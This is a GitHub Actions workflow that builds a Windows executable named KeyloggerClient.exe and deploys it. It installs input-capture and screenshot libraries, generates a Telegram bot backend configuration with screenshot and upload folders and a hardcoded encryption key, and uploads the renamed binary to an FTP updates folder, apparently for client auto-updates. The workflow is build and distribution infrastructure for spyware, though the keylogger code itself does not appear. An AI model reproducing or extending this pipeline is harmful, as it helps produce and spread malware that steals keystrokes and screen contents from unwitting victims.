name: Build and Deploy Telegram PHP Backend + Windows EXE

on:
  push:
    branches:
      - main

jobs:
  deploy:
    runs-on: windows-latest
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v3
    
    - name: Setup Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'
        cache: 'pip'
    
    - name: Install Python dependencies
      run: |
        python -m pip install --upgrade pip setuptools wheel
        pip install -r requirements.txt
        pip install pyinstaller
        pip install cryptography pynput pywin32 pillow pyautogui psutil requests python-dotenv packaging
    
    - name: Verify installations
      run: |
        python -c "import keyboard; print('keyboard OK')"
        python -c "import pyautogui; print('pyautogui OK')"
        python -c "import cryptography; print('cryptography OK')"
        python -c "import psutil; print('psutil OK')"
        python -c "import PIL; print('PIL OK')"
        pyinstaller --version
    
    - name: Build Windows EXE from Python
      env:
        CI: true
      run: |
        python build.py
    
    - name: Verify build output
      shell: powershell
      run: |
        if (-Not (Test-Path "dist/KeyloggerClient.exe")) {
          Write-Output "ERROR: Build failed - KeyloggerClient.exe not found!"
          exit 1
        }
        $fileSize = (Get-Item "dist/KeyloggerClient.exe").Length
        $fileSizeMB = [math]::Round($fileSize / 1MB, 2)
        Write-Output "Build successful! File size: $fileSizeMB MB"
        if ($fileSizeMB -lt 5) {
          Write-Output "WARNING: File size is suspiciously small ($fileSizeMB MB). Expected ~80 MB."
          Write-Output "Checking build artifacts..."
          Get-ChildItem -Path dist/ | Format-Table -AutoSize
        }
    
    - name: Rename built EXE by version
      shell: powershell
      run: |
        $version = "${{ secrets.CLIENT_VERSION }}"
        $renamed = "version_$($version -replace '\.', '_').exe"
        Rename-Item -Path "dist/KeyloggerClient.exe" -NewName $renamed
        Write-Output "RENAMED_FILE=$renamed" >> $env:GITHUB_ENV
        Write-Output "Renamed to: $renamed"
        Get-Item -Path "dist/$renamed" | Format-Table -AutoSize
    
    - name: Debug environment variables
      shell: powershell
      run: |
        Write-Output "RENAMED_FILE: ${{ env.RENAMED_FILE }}"
    
    - name: Generate .env file from secrets
      shell: powershell
      run: |
        New-Item -ItemType Directory -Force -Path telegram/log,telegram/uploads,telegram/screenshots
        $envContent = @(
          "BASE_URL=${{ secrets.BASE_URL }}",
          "SERVER_URL=${{ secrets.BASE_URL }}/api.php",
          "BOT_TOKEN=${{ secrets.BOT_TOKEN }}",
          "WEBHOOK_SECRET=${{ secrets.WEBHOOK_SECRET }}",
          "ADMIN_CHAT_ID=${{ secrets.ADMIN_CHAT_ID }}",
          "DB_HOST=${{ secrets.DB_HOST }}",
          "DB_NAME=${{ secrets.DB_NAME }}",
          "DB_USER=${{ secrets.DB_USER }}",
          "DB_PASS=${{ secrets.DB_PASS }}",
          "SECRET_TOKEN=1",
          "ENCRYPTION_KEY=nTds2GHvEWeOGJibjZuaf8kY5T5YWyfMx4J3B1NA0Jo=",
          "CLIENT_VERSION=${{ secrets.CLIENT_VERSION }}"
        ) -join "`n"
        Set-Content -Path telegram/.env -Value $envContent
        Write-Output ".env file created successfully"
    
    - name: Check if commit includes [upload]
      id: check_upload
      shell: powershell
      run: |
        $commitMessage = git log -1 --pretty=%B
        if ($commitMessage -match "\[upload\]") {
          Write-Output "upload=true" >> $env:GITHUB_OUTPUT
          Write-Output "Upload flag detected in commit message"
        } else {
          Write-Output "upload=false" >> $env:GITHUB_OUTPUT
          Write-Output "No upload flag in commit message"
        }
    
    - name: Upload Telegram PHP to FTP
      if: steps.check_upload.outputs.upload == 'true'
      uses: SamKirkland/FTP-Deploy-Action@4.0.0
      with:
        server: ${{ secrets.FTP_HOST }}
        username: ${{ secrets.FTP_USERNAME }}
        password: ${{ secrets.FTP_PASSWORD }}
        local-dir: telegram/
        server-dir: ${{ secrets.FTP_PATH }}/
        exclude: |
          **/.git*
          **/.github*
          **/node_modules/*
          **/*.md
          **/tests/*
    
    - name: Create updates directory on FTP
      if: steps.check_upload.outputs.upload == 'true'
      shell: powershell
      run: |
        Write-Output "Creating updates directory..."
        curl --ftp-create-dirs `
          --user "${{ secrets.FTP_USERNAME }}:${{ secrets.FTP_PASSWORD }}" `
          "ftp://${{ secrets.FTP_HOST }}${{ secrets.FTP_PATH }}/updates/" `
          -Q "MKD updates"
        if ($LASTEXITCODE -eq 0) {
          Write-Output "Directory created successfully"
        } else {
          Write-Output "Directory might already exist"
        }
    
    - name: Upload built EXE to FTP /updates/
      if: steps.check_upload.outputs.upload == 'true'
      shell: powershell
      run: |
        $renamedFile = "${{ env.RENAMED_FILE }}"
        Write-Output "Uploading $renamedFile to FTP..."
        $fileSize = (Get-Item "dist/$renamedFile").Length
        $fileSizeMB = [math]::Round($fileSize / 1MB, 2)
        Write-Output "File size: $fileSizeMB MB"
        curl -T "dist/$renamedFile" `
          --user "${{ secrets.FTP_USERNAME }}:${{ secrets.FTP_PASSWORD }}" `
          --ftp-create-dirs `
          --progress-bar `
          "ftp://${{ secrets.FTP_HOST }}${{ secrets.FTP_PATH }}/updates/$renamedFile"
        Write-Output "Upload completed!"
    
    - name: Verify FTP upload
      if: steps.check_upload.outputs.upload == 'true'
      shell: powershell
      run: |
        $renamedFile = "${{ env.RENAMED_FILE }}"
        Write-Output "Verifying uploaded file..."
        $result = curl --head `
          --user "${{ secrets.FTP_USERNAME }}:${{ secrets.FTP_PASSWORD }}" `
          "ftp://${{ secrets.FTP_HOST }}${{ secrets.FTP_PATH }}/updates/$renamedFile"
        if ($LASTEXITCODE -eq 0) {
          Write-Output "File verified on FTP!"
        } else {
          Write-Output "WARNING: Could not verify file on FTP"
        }
    
    - name: Upload artifacts
      if: always()
      uses: actions/upload-artifact@v4
      with:
        name: build-artifacts
        path: |
          dist/
          build/
        retention-days: 7